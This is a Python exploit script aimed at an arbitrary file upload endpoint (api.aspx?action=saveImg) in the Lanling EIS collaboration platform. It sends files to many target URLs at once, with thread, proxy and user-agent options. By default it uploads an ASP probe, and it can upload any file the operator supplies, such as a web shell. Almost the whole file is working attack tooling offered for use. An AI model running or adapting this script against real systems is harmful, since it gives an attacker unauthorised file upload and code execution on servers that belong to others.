import argparse
import concurrent.futures
import os
import re
import string
import time
import random
import requests
from user_agent import get_user_agent_pc
import copy

headers = None
proxies = None
timeout = None
delay = None
thread = None
DEFAULT_USER_AGENT = 'Mozilla/5.0.html (Windows NT 6.1; WOW64; rv:34.0.html) Gecko/20100101 Firefox/34.0.html'
MIN_VARIABLE_NUM = 1
MAX_VARIABLE_NUM = 10
MAX_LENGTH = 10
BACK_PATH = list()


def _post_request(url: str, file: dict, headers: dict = None) -> (int, requests.Response or str):
    global proxies
    try:
        res = requests.post(url, headers=headers, files=file, proxies=proxies, timeout=(5, 10))
        return 200, res
    except Exception as e:
        return 500, f"[!]Unable to access {url} normally, due to{e.args.__str__()}"


def create_random_variable_name(length: int, is_value: bool = False) -> tuple:
    _start = 0 if is_value else 1
    if length < 1 or length > MAX_LENGTH:
        if is_value:
            length = 1
        else:
            length = 2
    letters = string.ascii_letters
    nums_letters = string.ascii_letters + string.digits
    _prefix = ''.join(random.choice(letters) for _ in range(_start))
    _suffix = ''.join(random.choice(nums_letters) for _ in range(length))
    o = _prefix + _suffix
    return o, length


def create_random_variable_length() -> int:
    return random.randint(MIN_VARIABLE_NUM, MAX_VARIABLE_NUM)


def _get_content(o: requests.Response, encoding: str = "UTF-8") -> str:
    _encoding = encoding if o.encoding is None or not o.encoding else o.encoding
    return o.content.decode(_encoding)


def upload_evil_file(url: str, attack_url: str, headers: dict = None, o: str = None, _type: str = "asp"):
    print(f"[*]正在尝试攻击{url}...")
    url = url[:-1] if url.endswith("/") else url
    _value, _ = create_random_variable_name(create_random_variable_length(), is_value=True)
    fileObject = {
        'file': (f"{_value}.{_type}", o.encode(),
                 "Content-Type: text/html")
    }
    code, res = _post_request(url + attack_url, file=fileObject, headers=headers)
    if code != 200:
        print(res)
        return
    # print(res.content)
    print(f"[+]{url + _get_content(res)}")


def task(urls: list, payload: str, _type: str):
    attack_url = "/eis/service/api.aspx?action=saveImg"
    _headers = copy.deepcopy(headers)

    with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
        for url in urls:
            executor.submit(upload_evil_file, url, attack_url, _headers, payload, _type)
            time.sleep(delay if delay is not None else 0)


def set_cmd_arg() -> any:
    description = ' Upload any file on Lanling EIS smart collaboration platform'
    parser = argparse.ArgumentParser(description=description, add_help=True)

    targets = parser.add_mutually_exclusive_group(required=True)
    targets.add_argument('-u', '--url', type=str, help='Enter target object')
    targets.add_argument("-f", '--file', type=str, help='Input target object file')

    upload = parser.add_mutually_exclusive_group(required=False)
    upload.add_argument('--upload', type=str, help='Enter the filepath')

    useragent = parser.add_mutually_exclusive_group(required=False)
    useragent.add_argument('--random-agent', type=bool, help='Using random user agents')
    useragent.add_argument('-a', '--useragent', type=str, help='Using the known User-agent')

    parser.add_argument('-d', '--delay', type=int,
                        required=False, help='Set multi threaded access latency (setting range from 0 to 5)')
    parser.add_argument('-t', '--thread', type=int,
                        required=False, help='Set the number of program threads (setting range from 1 to 50)')
    parser.add_argument('--proxy', type=str, required=False, help='Set up the proxy')
    parser.add_argument('--file-type', type=str, required=False, default='asp', help='Upload file type(default is PHP)')

    args = parser.parse_args()
    return args


def parse_cmd_args(args) -> dict:
    o = dict()
    if args.url is None or not args.url:
        o.setdefault('url', {'type': 'file', 'value': args.file})
    else:
        o.setdefault('url', {'type': 'str', 'value': args.url})

    _value = f"""<% response.write("{(create_random_variable_name(create_random_variable_length(), is_value=True))[0]}") %>"""

    if not args.upload:
        o.setdefault('content', {'type': 'str',
                                 'value': _value})
        print(f"[!]尝试执行payload:{_value}")
    else:
        o.setdefault('content', {'type': 'file', 'value': args.upload})

    options = dict()
    if args.random_agent is not None and args.random_agent:
        user_agent = get_user_agent_pc()
    else:
        user_agent = DEFAULT_USER_AGENT
    options.setdefault('user_agent', user_agent)

    options.setdefault('delay', args.delay if args.delay is not None else 0)
    options.setdefault('thread', args.delay if args.thread is not None else 1)
    options.setdefault('proxy', args.proxy if args.proxy is not None else None)
    options.setdefault('file_type', args.file_type if args.file_type is not None and args.file_type else "asp")
    o.setdefault('options', {"type": "str", "value": options})
    return o


def parse_param(o: dict) -> (list, str, str):
    global proxies, headers, timeout, delay, thread

    def check_proxy(content: str) -> (int, str):
        mode = re.compile("^(?P<protocol>(http|https|socks4|socks5))://([A-Za-z0-9]*:[A-Za-z0-9]*@)?([A-Za-z0-9.\-]+)(:[0-9]+)(/[A-Za-z0-9./]*)?", re.I)
        groups = mode.search(content)
        if groups is None:
            return 500, "Unreasonable proxy settings"
        try:
            protocol = groups.group("protocol")
            return 200, protocol
        except Exception as e:
            return 404, "Failed to identify the protocol used by the agent"

    brute_list = get_data_brute_params(o)
    urls = brute_list.get('url', None)
    options = brute_list.get('options', None)
    payload = (brute_list.get('content'))[0]
    if options:
        options = options[0]
    _proxy = options.get('proxy', None)
    _type = options.get('file_type', 'asp')
    if _proxy is None or not _proxy:
        proxies = _proxy
    else:
        code, content = check_proxy(_proxy)
        if code != 200:
            proxies = _proxy
        else:
            proxies = dict()
            proxies.setdefault(content, _proxy)

    headers = dict() if headers is None or not headers else headers
    headers.setdefault("User-Agent", options.get('user_agent', DEFAULT_USER_AGENT))

    timeout = options.get('time_out', 0)
    delay = options.get('delay', 0)
    thread = options.get('thread', 1)

    return urls, payload, _type


def get_data_brute_params(url_dict: dict) -> dict:
    brute_list = {
        'url': None
    }

    for key, value in url_dict.items():
        _type = value.get("type")
        if _type is None or not _type:
            continue
        if _type == "file":
            _value = value.get("value")
            code, res = get_data_from_file(_value, mode="r")
            if code != 200:
                print(res)
                continue
            brute_list[key] = res
        else:
            brute_list[key] = [value.get('value', None), ]
    return brute_list


def get_data_from_file(filename: str, mode: str) -> tuple:
    def check_filename(name: str) -> (int, str or None):
        if not os.path.isabs(name):
            name = os.path.abspath(os.path.join(os.getcwd(), name))
        if not os.path.exists(name):
            return 404, f"[!]{name} does not exist"
        if not os.path.isfile(name):
            return 405, f"[!]{name} is Not a legal document"
        return 200, name

    try:
        code, content = check_filename(filename)
        if code != 200:
            return code, content
        with open(filename, mode=mode) as f:
            content = f.read().split("\n")
        return 200, content
    except Exception as e:
        return 200, f"[!]Unexpected error occurred during file processing while opening {filename}"


def main() -> None:
    args = set_cmd_arg()
    obj = parse_cmd_args(args)
    urls, payload, _type = parse_param(obj)
    task(urls, payload, _type)


if __name__ == '__main__':
    main()
